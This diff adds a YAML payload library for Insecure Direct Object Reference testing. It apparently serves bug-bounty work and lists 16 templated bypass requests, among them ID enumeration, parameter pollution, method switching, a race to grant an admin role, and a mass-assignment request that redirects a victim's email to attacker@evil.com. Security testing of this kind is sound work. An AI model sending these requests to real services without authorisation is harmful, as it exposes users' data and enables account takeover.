@@ -1,0 +1,101 @@
+# idor.yaml — Insecure Direct Object Reference bypass techniques
+metadata:
+  version: "1.0"
+  sources:
+    - "AllAboutBugBounty/daffainfo"
+    - "OWASP IDOR Prevention"
+    - "HackerOne disclosed reports"
+    - "Bug Bounty Bootcamp"
+  last_updated: "2026-03-27"
+
+# ──────────────────────────────────────────────
+# 16 IDOR BYPASS TECHNIQUES
+# ──────────────────────────────────────────────
+
+numeric_id_manipulation:
+  - name: sequential_id_increment
+    payload: "GET /api/users/1001 (your ID is 1000)"
+    context: "API endpoint using sequential numeric IDs"
+    notes: "Simplest IDOR. Change your ID to adjacent values. Try +1, -1, +100, 0, negative values."
+
+  - name: negative_id_values
+    payload: "GET /api/users/-1"
+    context: "API endpoint using numeric IDs without proper validation"
+    notes: "Negative IDs may bypass validation or hit default/admin records."
+
+uuid_manipulation:
+  - name: uuid_leakage_in_responses
+    payload: "Search for UUIDs in: API responses, HTML source, JS files, WebSocket messages, email links, export files"
+    context: "API using UUID-based references that seem non-guessable"
+    notes: "UUIDs are not secret. Search all responses, sitemap, robots.txt, cached pages for leaked UUIDs of other users."
+
+  - name: uuid_version_prediction
+    payload: "Generate UUID v1 variants based on discovered UUID timestamp and MAC components"
+    context: "API using UUID v1 (time-based) identifiers"
+    notes: "UUID v1 contains timestamp and MAC address. Knowing one UUID lets you predict adjacent ones."
+
+parameter_pollution:
+  - name: duplicate_parameter
+    payload: "GET /api/profile?user_id=attacker_id&user_id=victim_id"
+    context: "API that processes duplicate parameters differently"
+    notes: "HTTP Parameter Pollution (HPP). Backend may use first param for auth check, last for data fetch."
+
+  - name: array_parameter
+    payload: "GET /api/profile?user_id[]=attacker_id&user_id[]=victim_id"
+    context: "API that accepts array parameters"
+    notes: "Array notation may bypass single-value validation. Server may process all values."
+
+http_method_switching:
+  - name: method_switch_get_to_post
+    payload: "Change GET /api/users/1001 to POST /api/users/1001 with body: {}"
+    context: "GET endpoint returns 403 but POST is not checked"
+    notes: "Authorization may only be enforced on one HTTP method. Try GET, POST, PUT, PATCH, DELETE."
+
+  - name: method_switch_put_to_patch
+    payload: "Change PUT /api/users/1001 to PATCH /api/users/1001 with same body"
+    context: "PUT endpoint has auth checks but PATCH does not"
+    notes: "Different HTTP methods may have different authorization middleware."
+
+encoding_bypass:
+  - name: base64_encoded_id
+    payload: "GET /api/users/MTAwMQ== (base64 of '1001')"
+    context: "API using base64-encoded IDs"
+    notes: "Decode the ID, modify it, re-encode. Common with GraphQL relay-style IDs."
+
+  - name: hashed_id_with_known_algorithm
+    payload: "Generate MD5/SHA1 of victim's sequential ID to match hash-based reference"
+    context: "API using hashed IDs where hash algorithm is known"
+    notes: "If IDs are MD5(sequential_number), compute hash for target user's number."
+
+path_traversal:
+  - name: nested_object_reference
+    payload: "GET /api/orgs/ORG_ID/users/VICTIM_USER_ID"
+    context: "Multi-tenant API with nested resource paths"
+    notes: "Change both org and user IDs. Some apps only check org membership, not user-level access."
+
+  - name: indirect_reference_chain
+    payload: "POST /api/reports with body: {\"user_id\": \"victim_id\", \"type\": \"financial\"}"
+    context: "Reporting or export endpoints that accept user references"
+    notes: "Endpoints that generate reports/exports often have weaker auth than direct data endpoints."
+
+api_version_bypass:
+  - name: older_api_version
+    payload: "GET /api/v1/users/1001 (when current is /api/v3/)"
+    context: "API with multiple versions where older versions lack auth"
+    notes: "Older API versions may not have IDOR fixes. Try /v1/, /v2/, /beta/, /internal/."
+
+  - name: graphql_node_query
+    payload: "query { node(id: \"VICTIM_GLOBAL_ID\") { ... on User { email, phone } } }"
+    context: "GraphQL API with Relay-style global node interface"
+    notes: "GraphQL node() query often bypasses resolver-level auth checks."
+
+state_manipulation:
+  - name: race_condition_idor
+    payload: "Send 50 concurrent PUT /api/users/1001/role requests with {\"role\": \"admin\"}"
+    context: "API endpoints with time-of-check-time-of-use vulnerability"
+    notes: "Race condition between authorization check and data modification."
+
+  - name: wildcard_or_mass_assignment
+    payload: "PATCH /api/profile with body: {\"id\": \"victim_id\", \"email\": \"attacker@evil.com\"}"
+    context: "API that accepts object IDs in request body alongside update fields"
+    notes: "Mass assignment combined with IDOR. Include ID field in update body to target another user."
